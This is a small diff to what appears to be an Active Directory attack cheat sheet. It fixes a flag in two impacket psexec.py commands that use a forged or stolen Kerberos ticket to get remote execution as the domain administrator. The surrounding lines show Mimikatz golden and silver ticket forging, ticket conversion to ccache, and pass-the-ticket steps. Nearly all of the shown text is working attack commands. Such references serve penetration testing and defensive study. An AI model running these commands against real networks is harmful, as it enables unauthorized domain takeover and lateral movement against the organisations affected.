@@ -348,7 +348,7 @@ cat $KRB5CCNAME
 
 
 NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file
-./psexec.py -k -no-pass --dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
+./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
 
 ### PassTheTicket Silver Tickets
@@ -363,7 +363,7 @@ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARG
 Then use the same steps as a Golden ticket
 misc::convert ccache ticket.kirbi
 export KRB5CCNAME=/home/user/ticket.ccache
-./psexec.py -k -no-pass --dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
+./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
 
 ### Trust Tickets
